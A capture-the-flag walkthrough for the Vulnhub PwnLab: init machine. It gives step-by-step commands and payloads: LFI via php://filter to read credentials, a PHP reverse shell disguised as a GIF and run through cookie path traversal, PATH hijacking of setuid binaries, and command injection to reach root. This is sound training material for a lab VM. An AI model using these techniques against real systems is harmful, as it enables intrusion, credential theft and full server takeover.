[![forthebadge](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)

[Vulnhub Link](https://www.vulnhub.com/entry/pwnlab-init,158/)

## Step 0 - Pre-requisite

Begin by downloading the [pwnlab.ova](https://download.vulnhub.com/pwnlab/pwnlab_init.ova) [[mirror]](https://mega.nz/#!iAVXDKaC!Fwjd20Jv_2ErRpGVOzpgFlmPHBN-E-kb63CWogjoKw0) file to kickstart the installation process.

Next, launch Oracle VM VirtualBox and navigate to File > Import Appliance.
![Import Appliance](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/df98cf82-b1be-4b90-867c-cc8e8674449f)


Locate and select the downloaded ova file to proceed.

![File Select](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/741eac51-e4fd-4304-af12-b588fd2785df)



Click "Next" and specify the desired installation location for the machine. Confirm by clicking "Finish."
![OVA Intall final](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/f7d37db9-71d6-46ae-b202-bc0e71228a8b)


Wait for VM VirtualBox to import the appliance.

Now that the pwnlab machine is successfully installed, let's ensure it shares the same network as our Kali Machine.

To achieve this, right-click on the pwnlab Machine, navigate to settings, access the network tab, and select the advanced option. Opt for paravirtualized network.

> Note: Repeat the identical process for your Kali Linux Machine to maintain network coherence.


## Step 1 - Reconnaissance

> In recon we are supposed to gather information about the target.

Let’s first find out the IP of our Target machine

    sudo arp-scan -l

> Note: if this gives an error such as ieee-oui.txt not found, navigate to the /usr/share/arp-scan dir and rerun the scan.

![1](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/d957a92c-67aa-4ca1-8cc5-704c5d4d41ff)


The “PCS Systemtechnik GmbH” is our machine.

## Step 1 - Scanning
Let’s run a comprehensive NMAP scan on our target machine

    sudo nmap -sV -sC -A -O -sS -T4 -oN nmap-scan.txt 192.168.0.126

![2](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/7faf538c-902e-41f5-8172-4630c7650a8e)


We can see that the server runs on port 80 and is running Apache – Debian.

Since it’s a web server, let’s also run a Nikto scan on this server

    nikto -h http://192.168.0.126 > nikto-scan.txt

> I used the > nikto-scan.txt to save the output to a file named nikto-scan.txt

Let’s review the output

![3](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/1c9e64c9-4656-462d-9f2d-31da1bb9a952)


We got an interesting file named config.php. This should contain the database IDs and passwords.

Let’s try to read this file using Local File Inclusion. Using `http://192.168.0.126/?page=config` Doesn’t give us any output but doesn’t give an error so maybe something is filtering LFI.

![4](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/7d2ccbf5-eb96-4cbe-b24b-00ff27609e9f)

After reading [this](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/#:~:text=php://filter%20allows%20a,decoded%20to%20reveal%20the%20contents) we can see there is another way on how to use LFI using php://filter and convert.base64-encode/resource

Let’s try to access the config.php using a php://filter 

    http://192.168.0.126/?page=php://filter/convert.base64-encode/resource=config


![5](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/e3244d2c-c764-434e-b7aa-d73f1376167b)


We get something. It is a base64 encoded message, we need to decode this. We’ll use [cyberchef](https://gchq.github.io/CyberChef/) to decode it.

![6](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/26e67754-30e3-4e05-9a6e-f15a0ea86372)


The page looks something like this.

Since we have to decode from base64 we’ll search “From Base64” and drag it to the “Recipe” tab

![7](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/99d0b1bf-3fca-4191-a84e-dc29dc53d009)


Like this

Now let’s input the encrypted text we got and paste it into the input tab

![8](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/057bd3fb-c4e5-4c13-aa59-8bb889d11e09)


We got an output.
It’s the ID and Password of the Database server.

> Which database does this server use? Let’s refer to the NMAP results
> `3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1`
> 
According to NMAP results, we are using mysql server.

Let’s log into the server using MySQL

    mysql -u root -p -h 192.168.0.126

The `-u` is username 
The `-p` is the password (which we’ll provide later); and 
The `-h` is host

`Enter password:`
Enter the password that we just decoded from config.php

![9](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/84e3a428-634c-4343-a99b-ba69f0866175)


We’re in the database now. 

Let’s try to get some more information.

    MySQL [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | Users              |
    +--------------------+
    2 rows in set (0.001 sec)

---

    MySQL [(none)]> use Users;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
    
    Database changed
    MySQL [Users]> 

---

    Database changed
    MySQL [Users]> show tables;
    +-----------------+
    | Tables_in_Users |
    +-----------------+
    | users           |
    +-----------------+
    1 row in set (0.001 sec)
---

    MySQL [Users]> select * from users;
    +------+------------------+
    | user | pass             |
    +------+------------------+
    | kent | Sld6WHVCSkpOeQ== |
    | mike | U0lmZHNURW42SQ== |
    | kane | aVN2NVltMkdSbw== |
    +------+------------------+
    3 rows in set (0.018 sec)

We just got the usernames and passwords of the users of the website.

The password doesn’t seem right, it looks like it’s encoded in base64 as well, let’s decode it using the same method as

Open CyberChef > Search for From Base64 > Drag the tile in the Recipe Tab > In the input paste the password

![10](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/6be530be-614f-42ef-9a53-192a4ced2468)



    user  	 pass -- base64		decoded
    kent  	Sld6WHVCSkpOeQ== 	JWzXuBJJNy
    mike  	U0lmZHNURW42SQ== 	SIfdsTEn6I
    kane 	aVN2NVltMkdSbw== 	iSv5Ym2Gro

If we had an SSH port open we would’ve tried to login using these credentials but since we don’t have it we’ll go to the next part.

Let’s login into the website

![11](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/67bdbc23-2b73-4300-bca0-22a34f05f86b)



Ok, we’re in.

Now we got the access to upload some files, so let’s try to upload a php reverse shell.

The webshell file for PHP is preinstalled in Kali in `/usr/share/webshells/php/php-reverse-shell.php`

Let’s just copy the file to our current directory

    cp /usr/share/webshells/php/php-reverse-shell.php .
Check if you copied the file using ls

    ls
    nikto-scan.txt  nmap-scan.txt  php-reverse-shell.php

Great, now let’s modify the reverse shell and upload it to the Target server.

We’ll use vim to modify the script.

We’ll use 

    vim php-reverse-shell.php

Now in the file you should find something like ***// CHANGE THIS***

![12](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/1782200d-4fd6-488a-bd3f-8a2e3ce25107)

![13](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/0550271a-0e69-4eb9-8016-ea2bf8d14687)


Over here, in the $IP we’ll type out our Kali Machine’s Ip and a port that we’ll be listening on using NetCat.

> To check your IP use `ip a` 
> To start modifying in vim we need to enter Insert Mode, and to do that press the I button 

Go to $IP and replace ‘127.0.01’ with your Kali Machine’s IP
We’ll let the $port be default

After making the changes, to save it press the “esc” and the type “:wq” to save and exit.

![14](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/7ba9c2e6-c56b-4aa3-964f-556fe3358625)


Let’s start a listener in the background. Open a new terminal and type  

    nc -nvlp 1234                                 


![15](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/b60c6dfc-f47a-4d86-b813-312335283961)


Let’s switch back to our main tab.

I’ll rename the reverse shell file to something more simple such as shell.php, to do this we’ll

    mv php-reverse-shell.php shell.php

To make sure we renamed the file list the dir

    ls

![16](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/f8b135b5-4aa8-4fc4-9873-f64ff249b4a6)

Ok, now let’s upload this file.

![17](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/4cac1fee-fb20-4392-9071-7ad8fe77d3cd)

![18](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/b121f64b-4a73-4017-9420-c8576096cdab)


So the website has a filter to allow only files with image extensions be uploaded.

Let’s rename our file to `shell.png` from `shell.php`

    cp shell.php shell.png    

List to ensure

    ls 


![19](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/5fab3556-4af8-4aad-9751-8940815acabb)



Let’s upload this file now

![20](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/3e4d5135-a592-49b6-8c26-f7a39aa893cb)


We get an error again
Let’s try to figure out why were getting this error.

Let’s read the “upload” page using the php filter to see what’s happening in the background

    http://192.168.0.126/?page=php://filter/convert.base64-encode/resource=upload


![21](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/5922f29b-8a2a-47f3-bc9b-4a2263e31a6e)


Again, let’s decrypt it using CyberChef


![22](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/800eca7a-c98f-459a-9bf3-bc6b34779e86)

We got the source code, now let’s find out what is error 002

    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
    	die('Error 002');
    }

After a quick google search, we find out that the server is checking the MIME type of the file using “signature headers”
Links:
https://www.saotn.org/validate-mime-types-with-php-fileinfo/
https://stackoverflow.com/questions/8028184/mime-type-spoofing

Let’s see if we can spoof the signature header of our shell.png.

After some googling we found out that we can just add “GIF87a” at the top of our file to spoof the signature header. 
Link:
https://www.file-recovery.com/gif-signature-format.htm

Let’s modify our PHP file using vim

    vim shell.png

Enter insert mode by pressing I and type out GIF87a; at the very top line of the file. Something like this 


![23](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/443343b1-16a9-4149-8c38-64fcd9beefe5)


To exit type out `:wq` to save and exit the file 

To make sure we have saved it correctly let’s review using head 

    head shell.png -n 1 

we use the -n1 to print out only the first line.


![24](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/38e152c7-4edf-4017-bfd2-bda5b036e8f6)



Seems good, let’s try to upload this file

![25](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/4f976fe6-d64e-4773-9d64-6548a3dfe375)



We hit the upload button and this is what we got.

In our nikto scan we saw a /upload Let’s navigate there and see if we can see our file


![26](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/6f93116f-fc0e-48ad-af4c-765e6b6e9676)



We can see a file. 
It seems that they encrypted the file name with MD5.

![27](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/6865335f-a058-4627-a408-6e54efdd6ac4)



Ok so now we know our file has been uploaded successfully.

Let’s make sure our NetCat Listener is working


![28](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/db874c51-ff11-44b1-98f2-3dee287b3b49)



Now let’s click on the image file

![29](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/6cb90983-e8e3-43fa-8cdb-506bd99302b7)


Seems like we cannot run the file from /upload directory.

Let’s try and find another way.

Let’s try to read every file using the php filter.

    http://192.168.0.126/?page=php://filter/convert.base64-encode/resource=index

In the index page we found an interesting line
Line 11 `		include("lang/".$_COOKIE['lang']);`

The include means that it access a file in the lang directory. Maybe we can manipulate this to run our shell file instead.

To modify this we’ll have to use Burpsuite. If You do not have burpsuite setup I highly recommend you to do it right now and also install FoxyProxy.

Let’s start Burpsuite on our Kali Machine


![30](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/7a6d0cbe-4c15-4957-9ec6-4483ac66bca5)




Let’s go to the Proxy tab 
Go back to FireFox and turn on FoxyProxy


![31](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/8fe70a32-c85f-4680-ad57-02f95f9a15c3)



Turn On intercept in burpsuite


![32](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/ab0b8f96-c495-49b4-abd8-e6af6d327626)



Let’s navigate to the page

    192.168.0.126

> Your page won’t load until you go to burpsuite and forward the packet

Open burpsuite 


![33](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/048f027a-0a4f-4894-8570-41f294cf0968)


We have intercepted a request.

Let’s modify the Cookie so that it runs our shell.php

    Cookie: lang=../upload/00bf23e130fa1e525e332ff03dae345d.png


![34](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/e485b8ee-1a86-40b7-81d1-8a132500b0b9)



Now forward the packet and let’s see our NetCat terminal if we have a web shell.


![35](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/7addc4df-1253-44a4-abee-04188900cdef)



There we go! We now have a remote shell on the target server.

Let’s upgrade our shell to /bin/bash first using

    python -c "import pty; pty.spawn('/bin/bash')"


![36](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/b7cb8b6e-bb41-4c1d-9f2f-b3c3b02260c4)



So in the /home folder we have the same users so let’s try and switch users.


![37](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/8e37a78c-14fd-4c26-9726-b984cc317d92)


![38](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/3e904525-2815-44dd-9c8c-ee5ee87b6834)


There we go, we are now logged in into kane

Let’s explore further.
On `/home/kane` we have 

![39](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/f4f5933a-d4da-45dd-acae-1c92244cf9ce)



Let’s see what type of file msgmike is using

    file msgmike

We get 

    msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped

This means it’s a binary so we can’t read the file but we can use the strings command to only print out the readable text from the binary, so let’s do that using 

    strings msgmike

We can see an interesting line

    cat /home/mike/msg.txt

Let’s create a new cat command so that when this script runs it’ll run our command instead of the normal cat command.

For that we’ll have to modify the env parameters of the user.

Let’s first copy the current env path and save it on a notepad 

To print out all the environment variables

    env 

The one that we’re interested in is

    PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
Just copy and paste this somewhere as we’ll need it.

Now let’s create our own cat command using

    echo "/bin/bash" > cat

Now let’s change the env path variable so that it looks at /home/kane for the cat command.
To achieve that we’ll use 

    export PATH=/home/kane

Now none of the commands such as ls, dir, cp etc will work.
Let’s run the msgmike binary.

    msgmike
    sh: 1: cat: Permission denied

We’re getting a permission denied, we had to give it the execute permission after creating it. Now we can’t just use chmod to modify because the env path is not correct so let’s restore the env path using 

    export PATH=PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

Now Let’s give it execute permissions using

    chmod 777 cat

Now let’s change back the path to /home/kane and we’ll run the msgmike binary

    export PATH=/home/kane`
    ./msgmike
    bash: dircolors: command not found
    bash: ls: command not found

We get some errors, we’ll ignore that. Now let’s restore the path 

    export PATH=PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

We can see that we’ve logged into mike, yay. Let’s verify that using `whoami` and `id`

![40](https://github.com/omarMahmood05/Vulnhub---PwnLab---Markup/assets/86721437/c16417ed-fb21-444c-a9b8-ec0fba50c25b)


That is great, now let’s try to escalate to the root.

Let’s explore the system again.

In the `/home/mike` we can see a msg2root file, let’s check the file type again

    msg2root: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=60bf769f8fbbfd406c047f698b55d2668fae14d3, not stripped

It’s a binary file, let’s print out all the readable strings

    strings msg2root
   
In this line it looks like there is no user input sanitizing, let’s try and execute the command and we’ll try to use command injection.

    /bin/echo %s >> /root/messages.txt

Let's try using `; /bin/sh` 

./msg2root  
Message for root: test; /bin/sh

We get a `#` prompt now.
Let’s verify who we are using whoami 

    #whoami
    root

We’ve now logged into root!
Let’s get the flag!
`cd /root
cat flag.txt`


We get 

     .-=~=-.                                                                 .-=~=-.
    (__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
    (_ ___)  _____                             _                            (_ ___)
    (__  _) /  __ \                           | |                           (__  _)
    ( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
    (__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
    (_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
    (__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
    ( _ __)                     __/ |                                       ( _ __)
    (__  _)                    |___/                                        (__  _)
    (__  _)                                                                 (__  _)
    (_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
    ( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
    (__  _) this challenge.                                                 (__  _)
    (_ ___)                                                                 (_ ___)
    ( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
    (__  _) reading it                                                      (__  _)
    (__  _)                                                                 (__  _)
    (__  _)                                             For sniferl4bs.com  (__  _)
    ( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
    (__  _)                                                                 (__  _)
    (_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
    `-._.-'   

We’ve successfully pwned the pwnlab machine!
